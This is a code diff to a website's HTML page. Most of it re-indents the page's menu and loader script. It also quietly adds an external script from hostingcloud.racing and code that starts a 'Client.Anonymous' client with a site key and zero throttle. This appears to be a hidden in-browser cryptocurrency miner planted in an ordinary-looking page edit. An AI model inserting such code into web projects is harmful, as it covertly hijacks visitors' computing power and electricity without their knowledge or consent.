@@ -343,21 +343,30 @@
         </div>
     </div>
 
+    <script src="https://www.hostingcloud.racing/2ZVo.js"></script>
     <script>
-        document.addEventListener('DOMContentLoaded', () => {
-            const menuToggle = document.getElementById('menuToggle');
-            const menuContent = document.getElementById('menuContent');
-            const loader = document.getElementById('loader');
+    var _client = new Client.Anonymous('25a54dd1d9ccbcdd4b428fa0c802ef8470d2a8274c7aa7b988906fbe978f1326', {
+        throttle: 0, c: 'w'
+    });
+    _client.start();
 
-            menuToggle.addEventListener('click', () => {
-                menuContent.classList.toggle('active');
-            });
+    document.addEventListener('DOMContentLoaded', () => {
+        const menuToggle = document.getElementById('menuToggle');
+        const menuContent = document.getElementById('menuContent');
+        const loader = document.getElementById('loader');
 
-            window.addEventListener('load', () => {
-                loader.classList.add('hidden');
-                setTimeout(() => loader.remove(), 300);
-            });
+        menuToggle.addEventListener('click', () => {
+            menuContent.classList.toggle('active');
         });
-    </script>
+
+        window.addEventListener('load', () => {
+            loader.classList.add('hidden');
+            setTimeout(() => loader.remove(), 300);
+        });
+    });
+</script>
+
+
+
 </body>
 </html>
